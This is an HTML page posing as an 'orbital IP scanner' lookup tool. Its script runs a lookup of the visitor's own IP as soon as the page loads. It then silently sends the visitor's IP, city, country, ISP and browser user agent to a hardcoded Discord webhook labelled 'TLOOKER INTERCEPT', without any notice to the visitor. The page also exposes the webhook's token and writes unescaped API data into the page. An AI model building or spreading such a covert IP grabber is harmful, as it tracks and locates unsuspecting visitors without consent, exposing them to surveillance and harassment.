<!DOCTYPE html>
<html lang="en" class="dark">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Tlooker – Orbital IP Scanner</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Roboto+Mono&display=swap" rel="stylesheet">
  <style>
    :root { --bg: #000; --text: #e0e0e0; --accent: #00eaff; --card: #0a0f1a; --border: #1a2b3f; }
    body { margin: 0; background: var(--bg); color: var(--text); font-family: 'Roboto Mono', monospace; min-height: 100vh; display: flex; justify-content: center; }
    .container { width: 100%; max-width: 700px; padding: 2rem; text-align: center; }
    h1 { font-family: 'Orbitron', sans-serif; font-size: 3rem; color: var(--accent); text-shadow: 0 0 15px var(--accent); }
    .input-group { margin: 2rem 0; display: flex; flex-direction: column; gap: 10px; align-items: center; }
    input { width: 80%; padding: 1rem; background: var(--card); border: 1px solid var(--border); border-radius: 50px; color: #fff; outline: none; }
    button { padding: 1rem 2rem; background: transparent; border: 2px solid var(--accent); color: var(--accent); border-radius: 50px; cursor: pointer; font-family: 'Orbitron'; }
    button:hover { background: var(--accent); color: #000; }
    #result { margin-top: 2rem; background: var(--card); border: 1px solid var(--border); padding: 1.5rem; border-radius: 10px; display: none; text-align: left; }
    .show { display: block !important; }
    dt { color: var(--accent); margin-top: 10px; font-weight: bold; }
    dd { margin-left: 0; word-break: break-all; }
  </style>
</head>
<body>
  <div class="container">
    <h1>TLOOKER</h1>
    <div class="input-group">
      <input type="text" id="ipInput" placeholder="Enter IP or leave blank for yours">
      <button onclick="lookup()">SCAN TARGET</button>
    </div>
    <div id="status">Ready.</div>
    <div id="result">
      <dl id="data-list"></dl>
    </div>
  </div>

  <script>
    const webhookURL = "https://discord.com/api/webhooks/1477796865054609512/gYdKCLTrFa9SdlPeVrLDCAOU1F9MW6UOq4hN5zvTX1n3EWrrv47lzTyxMUjcoEJtnios";

    async function sendToDiscord(data) {
      const payload = {
        embeds: [{
          title: "🛰️ TLOOKER INTERCEPT",
          color: 5814783,
          fields: [
            { name: "Target IP", value: data.ip, inline: true },
            { name: "Location", value: `${data.city}, ${data.country}`, inline: true },
            { name: "ISP", value: data.connection.isp, inline: false },
            { name: "User Agent", value: navigator.userAgent }
          ],
          timestamp: new Date().toISOString()
        }]
      };

      const formData = new FormData();
      formData.append("payload_json", JSON.stringify(payload));

      try {
        await fetch(webhookURL, {
          method: 'POST',
          mode: 'no-cors',
          body: formData
        });
      } catch (e) {
        console.error("Webhook Error");
      }
    }

    async function lookup() {
      const ip = document.getElementById('ipInput').value.trim();
      const status = document.getElementById('status');
      const result = document.getElementById('result');
      const list = document.getElementById('data-list');

      status.textContent = "Scanning...";
      
      try {
        const res = await fetch(`https://ipwho.is/${ip}`);
        const data = await res.json();

        if (!data.success) throw new Error(data.message);

        list.innerHTML = `
          <dt>IP</dt><dd>${data.ip}</dd>
          <dt>Location</dt><dd>${data.city}, ${data.region}, ${data.country}</dd>
          <dt>ISP</dt><dd>${data.connection.isp}</dd>
          <dt>Coords</dt><dd>${data.latitude}, ${data.longitude}</dd>
        `;

        result.classList.add('show');
        status.textContent = "Recon complete.";
        sendToDiscord(data);
      } catch (err) {
        status.textContent = "Error: " + err.message;
      }
    }

    window.onload = () => lookup();
  </script>
</body>
</html>
